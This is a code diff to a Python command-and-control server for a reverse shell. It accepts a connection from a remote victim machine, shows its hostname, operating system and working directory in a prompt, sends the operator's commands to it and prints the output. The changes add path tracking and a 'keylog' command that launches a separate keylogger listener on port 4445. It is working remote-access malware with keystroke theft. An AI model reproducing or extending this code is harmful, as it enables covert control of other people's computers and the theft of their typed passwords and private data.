@@ -33,6 +33,8 @@ def acceptSocket():
 	global addr
 	global hostname
 	global operatingSystem
+	global currentPath
+	os.system('cls')
 
 	try:
 		conn, addr = s.accept()
@@ -40,25 +42,31 @@ def acceptSocket():
 		data = conn.recv(1024).decode().split(',')
 		hostname = str(data[0])
 		operatingSystem = str(data[1])
+		currentPath = str(data[2])
 		menu()
 	except socket.error as msg:
 		print('Socket Accepting Error:', msg)
 
 def menu():
+	global currentPath
 	while True:
-		cmd = input(hostname + '@' + operatingSystem + '> ')
+		cmd = input(hostname + '(' + operatingSystem + ')@' + currentPath + '> ')
 		while cmd == "":
-			cmd = input(hostname + '@' + operatingSystem + '> ')
+			cmd = input(hostname + '(' + operatingSystem + ')@' + currentPath + '> ')
 		if cmd == 'quit':
 			conn.close()
 			s.close()
 			sys.exit()
+		elif cmd == 'keylog':
+			os.system('start python keylogServer.py 4445')
 
 		command = conn.send(cmd.encode('utf8'))
-		result = conn.recv(16834)
+		result = conn.recv(16834).decode()
 
-		if result != hostname:
-			print(result.decode())
+		if result[:12] == 'currentPath:':
+			currentPath = result[12:]
+		elif result != hostname:
+			print(result)
 
 def main():
 	createSocket()
